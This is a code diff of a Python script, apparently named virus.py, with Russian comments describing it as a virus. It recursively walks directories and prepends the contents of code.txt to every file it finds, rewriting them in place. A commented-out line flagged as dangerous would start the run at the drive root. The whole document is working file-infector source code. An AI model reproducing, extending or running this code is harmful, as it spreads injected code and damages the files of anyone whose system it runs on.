@@ -7,44 +7,52 @@ from os.path import isfile
 max_deep = None
 
 # Имена файлов для игнорирования
-ignore = ['virus.py', 'code.txt', 'tests.py']
+ignore = ['virus.py', 'code.txt', 'tests.py', '.git']
+
+'''
+# Меняем рабочую директорию на корень диска
+# "WARNING. DANGER!"
+os.chdir('C://')
+'''
 
 # Получаем код, для добавление в начало всех файлов
 with open('code.txt', 'r', encoding='utf-8') as file:
+    # Список из строк в файле
     code = file.readlines()
 
-def startInvasion(deep=1, path='.'):
+
+def startInvasion(deep=0):
     '''Рекурсивная функция, запускающая вирус.
     1. Вставление кода во все файлы текущей директории,
     2. переход в каждую из внутренних директорий и
-    3. вызов оттуда самой себя
+    3. вызов оттуда этой же функции
 
     Аргументы:
         deep - количество директорий вглубь,
-               относительно начальной
-        path - текущая директория, в которой ищем директории,
-               для дальнейшей работы программы
+               относительно начальной, в которых
+               будет выполнена функция
 
     '''
+    # Условие выхода из рекурсии:
     # Если кол-во шагов вглубь указано:
     if max_deep is not None:
         # Если кол-во шагов вглубь превышено:
         if deep > max_deep:
             return
     # Список файлов и директорий в текущей директории
-    files_n_dirs = os.listdir(path=path)
+    files_n_dirs = os.listdir(path='.')
     # Список исключительно файлов в текущей директории
-    files = [path+'/'+f for f in files_n_dirs if isfile(path+'/'+f) and f not in ignore]
+    files = [f for f in files_n_dirs if isfile(f) and f not in ignore]
     # Список исключительно директорий в текущей директории
-    dirs = [path+'/'+d for d in files_n_dirs if path+'/'+d not in files and d not in ignore]
-    print('deep= {}'.format(str(deep)))
-    '''print('path= {}'.format(path))
-    print('files_n_dirs= {}'.format(str(files_n_dirs)))
-    print('files= {}'.format(str(files)))
-    print('dirs= {}'.format(str(dirs)))'''
+    dirs = [d for d in files_n_dirs if d not in files and d not in ignore]
 
     # Вставляем пользовательский код в начало каждого файла
     for name in files:
+        '''
+        # Здесь можно получить расширение файла по его имени,
+        # чтобы выполнять следующие действия только для файлов
+        # определенного типа(как минимум, только для текстовых)
+        '''
         with open(name, 'r', encoding='utf-8') as file:
             # Список, содержащий строки файла
             lines = file.readlines()
@@ -56,12 +64,18 @@ def startInvasion(deep=1, path='.'):
         with open(name, 'w', encoding='utf-8') as file:
             for line in result:
                 file.write(line)
-        print('File: "{}" overwritten'.format(name))
-        print('Next dirs are: {}'.format(', '.join(dirs)))
+        print('Модифицирован файл: "{}"'.format(name))
 
     # Вызываем эту же функцию для всех внутренних директорий
     for directory in dirs:
-        startInvasion(deep=deep+1, path=directory)
+        # Переходим в нижестоящую директорию
+        os.chdir(directory)
+        # Запускаем функцию с соответствующими аргументами
+        startInvasion(deep=deep+1)
+        # Возвращаемся на директорию вверх, чтобы уже отсюда
+        # перейти в следующую директорию из списка
+        os.chdir('./../')
+
 
 # Начинаем работу вируса из текущей директории
 startInvasion()
